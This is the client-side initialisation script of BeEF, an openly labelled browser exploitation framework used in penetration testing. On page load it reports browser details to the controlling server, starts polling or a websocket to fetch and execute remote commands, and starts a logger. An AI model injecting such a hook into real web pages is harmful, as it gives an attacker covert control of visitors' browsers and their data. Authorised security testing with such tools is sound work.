//
// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/**
 * Contains the beef_init() method which starts the BeEF client-side
 * logic. Also, it overrides the 'onpopstate' and 'onclose' events on the windows object.
 *
 * If beef.pageIsLoaded is true, then this JS has been loaded >1 times
 * and will have a new session id. The new session id will need to know
 * the brwoser details. So sendback the browser details again.
 * 
 * @namespace beef.init
 */

beef.session.get_hook_session_id();

if (beef.pageIsLoaded) {
    beef.net.browser_details();
}
/**
 * @memberof beef.init
 */
window.onload = function () {
    beef_init();
};
/**
 * @memberof beef.init
 */
window.onpopstate = function (event) {
    if (beef.onpopstate.length > 0) {
        event.preventDefault;
        for (var i = 0; i < beef.onpopstate.length; i++) {
            var callback = beef.onpopstate[i];
            try {
                callback(event);
            } catch (e) {
                beef.debug("window.onpopstate - couldn't execute callback: " + e.message);
            }
            return false;
        }
    }
};
/**
 * @memberof beef.init
 */
window.onclose = function (event) {
    if (beef.onclose.length > 0) {
        event.preventDefault;
        for (var i = 0; i < beef.onclose.length; i++) {
            var callback = beef.onclose[i];
            try {
                callback(event);
            } catch (e) {
                beef.debug("window.onclose - couldn't execute callback: " + e.message);
            }
            return false;
        }
    }
};

/**
 * Starts the polling mechanism, and initialize various components:
 *  - browser details (see browser.js) are sent back to the "/init" handler
 *  - the polling starts (checks for new commands, and execute them)
 *  - the logger component is initialized (see logger.js)
 *  - the Autorun Engine is initialized (see are.js)
 * @memberof beef.init
 */
function beef_init() {
    if (!beef.pageIsLoaded) {
        beef.pageIsLoaded = true;
        beef.net.browser_details();

        if (beef.browser.hasWebSocket() && typeof beef.websocket != 'undefined') {
            setTimeout(function(){
                beef.websocket.start();
                beef.updater.execute_commands();
                beef.logger.start();
            }, parseInt(beef.websocket.ws_connect_timeout));
        }else {
            beef.net.browser_details();
            beef.updater.execute_commands();
            beef.updater.check();
            beef.logger.start();
        }
    }
}
